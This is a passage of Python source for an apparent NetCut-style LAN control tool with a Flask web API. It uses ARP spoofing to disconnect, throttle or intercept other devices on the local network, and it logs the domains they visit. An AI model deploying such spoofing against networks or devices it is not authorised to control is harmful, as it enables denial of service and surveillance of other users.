                    d.throttle_kbps = None
                    d.relay_error = None
                    self.forwarder.set_target(d.ip, 0)
                    self._start_spoof(d)
                    self.traffic.clear_ip(d.ip)
                    self.save_device(mac, {"state": "Disconnected", "throttle_kbps": None})
                    return True, "Disconnected"
                else:
                    self._stop_spoof(d)
                    self._restore(d)
                    self._unpin_local_neighbor(d.ip)
                    d.state = "Connected"
                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
                    return True, "Connected"
        return False, "Not found."

    def set_throttle(self, mac, kbps, bypass_quota=False):
        for d in self.devices:
            if d.mac == mac:
                if d.ip == self.gateway_ip: return False, "Cannot touch gateway."
                if d.mac == self.our_mac: return False, "Cannot touch your own device."
                if self._quota_restricted(mac, bypass_quota):
                    return False, "Quota Auto-Mode is controlling this device."
                if not kbps or kbps <= 0:
                    self._stop_spoof(d)
                    self._restore(d)
                    self._unpin_local_neighbor(d.ip)
                    d.state = "Connected"
                    d.throttle_kbps = None
                    d.watch = False
                    d.relay_error = None
                    self.forwarder.set_target(d.ip, 0)
                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
                    return True, "Restored"
                if not self._pin_control_path(d):
                    return False, "Could not protect this PC's neighbor table; limit was not started."
                d.throttle_kbps = kbps
                d.state = "Throttled"
                d.watch = False
                d.relay_error = None
                self._start_spoof(d)
                self.forwarder.set_target(d.ip, kbps, d.mac)
                self.save_device(mac, {"state": "Throttled", "throttle_kbps": kbps})
                return True, f"Throttled to {kbps} kbps"
        return False, "Not found."

    def set_watch(self, mac, watch, bypass_quota=False):
        for d in self.devices:
            if d.mac == mac:
                if d.ip == self.gateway_ip: return False, "Cannot touch gateway."
                if d.mac == self.our_mac: return False, "Cannot watch your own device."
                if self._quota_restricted(mac, bypass_quota):
                    return False, "Quota Auto-Mode is controlling this device."
                if watch:
                    if not self._pin_control_path(d):
                        return False, "Could not protect this PC's neighbor table; watch was not started."
                    d.watch = True
                    d.state = "Watched"
                    d.throttle_kbps = None
                    d.relay_error = None
                    self._start_spoof(d)
                    self.forwarder.set_target(d.ip, 30000, d.mac, watch=True)
                    self.save_device(mac, {"state": "Watched", "throttle_kbps": None})
                    return True, "Watched"
                else:
                    d.watch = False
                    self._stop_spoof(d)
                    self._restore(d)
                    self._unpin_local_neighbor(d.ip)
                    d.state = "Connected"
                    d.relay_error = None
                    self.forwarder.set_target(d.ip, 0)
                    self.save_device(mac, {"state": "Connected", "throttle_kbps": None})
                    return True, "Connected"
        return False, "Not found."

    def _sync_watch_lan(self):
        count = 0
        for d in self.devices:
            if (d.ip == self.gateway_ip or d.mac == self.our_mac
                    or d.state != "Connected"):
                continue
            ok, _ = self.set_watch(d.mac, True, bypass_quota=True)
            if ok:
                self.watch_lan_macs.add(d.mac)
                count += 1
        return count

    def set_watch_lan(self, enabled):
        if enabled:
            if self.quota.mode in ("throttle", "block"):
                return False, 0, "Disable active Quota Auto-Mode before Watch LAN."
            self.watch_lan_enabled = True
            count = self._sync_watch_lan()
            return True, count, "Watching discovered LAN clients."
        restored = 0
        for mac in list(self.watch_lan_macs):
            device = next((d for d in self.devices if d.mac == mac), None)
            if device and device.state == "Watched":
                ok, _ = self.set_watch(mac, False, bypass_quota=True)
                if ok:
                    restored += 1
        self.watch_lan_macs.clear()
        self.watch_lan_enabled = False
        return True, restored, "LAN watch stopped."

    def rename_device(self, mac, name):
        for d in self.devices:
            if d.mac == mac:
                d.custom_name = name
                self.save_device(mac, {"custom_name": name})
                return True
        return False

    def throttle_all(self, kbps, bypass_quota=False):
        count = 0
        for d in self.devices:
            if d.ip == self.gateway_ip or d.mac == self.our_mac:
                continue
            if d.state == "Offline":
                continue
            ok, _ = self.set_throttle(d.mac, kbps, bypass_quota=bypass_quota)
            if ok: count += 1
        return count

    def _accumulate_usage(self):
        try:
            total = self.traffic.total_bytes()
            delta = total - self._last_traffic_total
            self._last_traffic_total = total
            if delta > 0:
                self.quota.add_usage(delta)
        except Exception:
            pass

    def _device_snapshot(self, device):
        return {"state": device.state,
                "throttle_kbps": device.throttle_kbps,
                "watch": bool(device.watch)}

    def _restore_quota_devices(self):
        snapshots = dict(self.quota.managed_devices)
        self.quota.mode = None
        restored = set()
        for d in self.devices:
            original = snapshots.get(d.mac)
            if not original or d.state == "Offline":
                continue
            state = original.get("state", "Connected")
            if state == "Disconnected":
                if d.state != "Disconnected":
                    self.toggle_device(d.mac, bypass_quota=True)
            elif state == "Throttled":
                self.set_throttle(d.mac, int(original.get("throttle_kbps") or 300),
                                  bypass_quota=True)
            elif state == "Watched" or original.get("watch"):
                self.set_watch(d.mac, True, bypass_quota=True)
            else:
                self.set_throttle(d.mac, 0, bypass_quota=True)
            restored.add(d.mac)
        for mac in restored:
            self.quota.managed_devices.pop(mac, None)

    def _apply_quota_mode(self, mode):
        if mode is None:
            self._restore_quota_devices()
            return
        if self.watch_lan_enabled:
            self.set_watch_lan(False)
        self.quota.mode = mode
        for d in self.devices:
            if (d.ip == self.gateway_ip or d.mac == self.our_mac
                    or d.state == "Offline"):
                continue
            if d.mac not in self.quota.managed_devices:
                self.quota.managed_devices[d.mac] = self._device_snapshot(d)
            if mode == "block":
                if d.state != "Disconnected":
                    self.toggle_device(d.mac, bypass_quota=True)
            elif d.state != "Throttled" or d.throttle_kbps != self.quota.throttle_kbps:
                self.set_throttle(d.mac, self.quota.throttle_kbps, bypass_quota=True)

    def _enforce_quota(self):
        self._accumulate_usage()
        mode = None
        if self.quota.enabled and self.quota.limit_gb > 0:
            pct = self.quota.percent()
            if pct >= self.quota.block_pct:
                mode = "block"
            elif pct >= self.quota.throttle_pct:
                mode = "throttle"
        self._apply_quota_mode(mode)
        self.save_quota()

    def quota_info(self):
        self._accumulate_usage()
        return self.quota.to_dict()

    def restore_all(self, stop_services=False):
        if stop_services:
            self.traffic.stop()
            self.forwarder.set_stop()
            self.watcher.set_stop()
            if self.capture_stop: self.capture_stop.set()
            if self.auto_scan_thread: self.auto_scan_stop.set()
            self.safety_stop.set()
        self.forwarder.clear()
        self.watch_lan_enabled = False
        self.watch_lan_macs.clear()
        self.quota.mode = None
        self.quota.managed_devices.clear()
        if not stop_services:
            self.quota.enabled = False
        for d in self.devices:
            self._stop_spoof(d); self._restore(d)
            d.state = "Connected"
            d.throttle_kbps = None
            d.watch = False
            d.relay_error = None
            self.save_device(d.mac, {"state": "Connected", "throttle_kbps": None})
        self._clear_neighbor_pins()
        self.save_quota()

    def auto_scan_loop(self):
        while not self.auto_scan_stop.is_set():
            time.sleep(8)
            if self.auto_scan_stop.is_set(): break
            try:
                if self.scanning: continue
                found = self.arp_scan(passes=2)
                self.merge_scan_results(found)
                self.devices.sort(key=lambda x: x.ip)
                self._enforce_quota()
            except Exception:
                pass

    def start_auto_scan(self):
        self.auto_scan_stop.clear()
        self.auto_scan_thread = threading.Thread(target=self.auto_scan_loop, daemon=True)
        self.auto_scan_thread.start()

controller = NetCutController()

@app.route('/')
def index(): return render_template('index.html')

@app.route('/api/devices')
def get_devices():
    t = controller.traffic.get_traffic()
    return jsonify([{**d.to_dict(),
                     "traffic_kb": 0 if d.state == "Disconnected" else t.get(d.ip, 0)}
                    for d in controller.devices])

@app.route('/api/info')
def get_info():
    return jsonify({"ip": controller.ip, "gateway": controller.gateway_ip,
        "interface": controller.interface, "scanning": controller.scanning,
        "scan_progress": controller.scan_progress, "version": VERSION,
        "watch_lan": controller.watch_lan_enabled,
        "watch_lan_count": len(controller.watch_lan_macs)})

@app.route('/api/scan', methods=['POST'])
def scan():
    threading.Thread(target=controller.scan_network, daemon=True).start()
    return jsonify({"status": "started"})

@app.route('/api/toggle', methods=['POST'])
def toggle():
    data = request.get_json(silent=True) or {}
    mac = data.get('mac')
    if not isinstance(mac, str):
        return jsonify({"success": False, "error": "A valid MAC address is required."}), 400
    ok, s = controller.toggle_device(mac)
    return jsonify({"success": ok, "state": s}), (200 if ok else 409)

@app.route('/api/throttle', methods=['POST'])
def throttle():
    data = request.get_json(silent=True) or {}
    try:
        mac = data['mac']; kbps = int(data.get('kbps', 0))
    except (KeyError, TypeError, ValueError):
        return jsonify({"success": False, "error": "MAC and numeric speed are required."}), 400
    if not isinstance(mac, str) or not 0 <= kbps <= 30000:
        return jsonify({"success": False, "error": "Speed must be between 0 and 30000 kbps."}), 400
    ok, s = controller.set_throttle(mac, kbps)
    return jsonify({"success": ok, "state": s}), (200 if ok else 409)

@app.route('/api/watch', methods=['POST'])
def watch():
    data = request.get_json(silent=True) or {}
    mac = data.get('mac')
    if not isinstance(mac, str) or not isinstance(data.get('watch'), bool):
        return jsonify({"success": False, "error": "MAC and boolean watch state are required."}), 400
    ok, s = controller.set_watch(mac, data['watch'])
    return jsonify({"success": ok, "state": s}), (200 if ok else 409)

@app.route('/api/watch_lan', methods=['POST'])
def watch_lan():
    data = request.get_json(silent=True) or {}
    if not isinstance(data.get('enabled'), bool):
        return jsonify({"success": False, "error": "Enabled must be true or false."}), 400
    ok, count, message = controller.set_watch_lan(data['enabled'])
    return jsonify({"success": ok, "count": count, "state": message}), (200 if ok else 409)

@app.route('/api/rename', methods=['POST'])
def rename():
    data = request.get_json(silent=True) or {}
    mac = data.get('mac'); name = data.get('name')
    if not isinstance(mac, str) or not isinstance(name, str) or len(name.strip()) > 40:
        return jsonify({"success": False, "error": "Name must be 40 characters or fewer."}), 400
    ok = controller.rename_device(mac, name.strip())
    return jsonify({"success": ok}), (200 if ok else 404)

@app.route('/api/restore_all', methods=['POST'])
def restore_all():
    controller.restore_all(); return jsonify({"status": "ok"})

@app.route('/api/forwarder', methods=['GET'])
def forwarder_info():
    report = controller.forwarder.report()
    report["safety_events"] = list(controller.safety_events)
    return jsonify(report)

@app.route('/api/throttle_all', methods=['POST'])
def throttle_all():
    data = request.get_json(silent=True) or {}
    try: kbps = int(data.get('kbps', 0))
    except (TypeError, ValueError):
        return jsonify({"success": False, "error": "Speed must be numeric."}), 400
    if not 0 <= kbps <= 30000:
        return jsonify({"success": False, "error": "Speed must be between 0 and 30000 kbps."}), 400
    count = controller.throttle_all(kbps)
    return jsonify({"status": "ok", "count": count})

@app.route('/api/quota', methods=['GET'])
def quota_get():
    return jsonify(controller.quota_info())

@app.route('/api/domains', methods=['GET'])
def domains_get():
    since = time.time() - int(request.args.get('minutes', 5) or 5) * 60
    return jsonify(controller.watcher.get_domains(since=since))

@app.route('/api/quota', methods=['POST'])
def quota_set():
    data = request.get_json(silent=True) or {}
    try:
        enabled = data.get("enabled", controller.quota.enabled)
        limit_gb = float(data.get("limit_gb", controller.quota.limit_gb))
        throttle_kbps = int(data.get("throttle_kbps", controller.quota.throttle_kbps))
        throttle_pct = float(data.get("throttle_pct", controller.quota.throttle_pct))
        block_pct = float(data.get("block_pct", controller.quota.block_pct))
    except (TypeError, ValueError):
        return jsonify({"success": False, "error": "Quota values must be numeric."}), 400
    if not isinstance(enabled, bool):
        return jsonify({"success": False, "error": "Enabled must be true or false."}), 400
    if not all(math.isfinite(v) for v in (limit_gb, throttle_pct, block_pct)):
        return jsonify({"success": False, "error": "Quota values must be finite."}), 400
    if limit_gb < 0 or not 1 <= throttle_pct <= 100 or not 1 <= block_pct <= 100:
        return jsonify({"success": False, "error": "Use a non-negative limit and percentages from 1 to 100."}), 400
    if throttle_pct >= block_pct:
        return jsonify({"success": False, "error": "Throttle percentage must be lower than block percentage."}), 400
    if not 1 <= throttle_kbps <= 30000:
        return jsonify({"success": False, "error": "Quota speed must be between 1 and 30000 kbps."}), 400
    controller.quota.enabled = enabled
    controller.quota.limit_gb = limit_gb
    controller.quota.throttle_kbps = throttle_kbps
    controller.quota.throttle_pct = throttle_pct
    controller.quota.block_pct = block_pct
    if data.get("reset"):
        controller.quota.reset()
    controller._enforce_quota()
    return jsonify({"success": True, **controller.quota_info()})

def cleanup():
    print("\nRestoring all..."); controller.restore_all(stop_services=True)

if __name__ == '__main__':
    import ctypes
    if os.name == 'nt':
        try:
            ctypes.windll.winmm.timeBeginPeriod(1)
        except Exception:
            pass
    if os.name == 'nt' and not ctypes.windll.shell32.IsUserAnAdmin():
        print("Run as Administrator."); sys.exit(1)
    elif os.name == 'posix' and os.geteuid() != 0:
        print("Run as root."); sys.exit(1)
    success, err = controller.discover_interfaces()
    if not success: print(f"Error: {err}"); sys.exit(1)
    print(f"Interface: {controller.interface} ({controller.ip})")
    print(f"Gateway: {controller.gateway_ip}")
    print("Scanning in background...")
    threading.Thread(target=controller.scan_network, daemon=True).start()
    controller.start_auto_scan()
    print(f"Web UI: http://0.0.0.0:5000")
    signal.signal(signal.SIGINT, lambda s, f: (cleanup(), os._exit(0)))
    app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False, threaded=True)
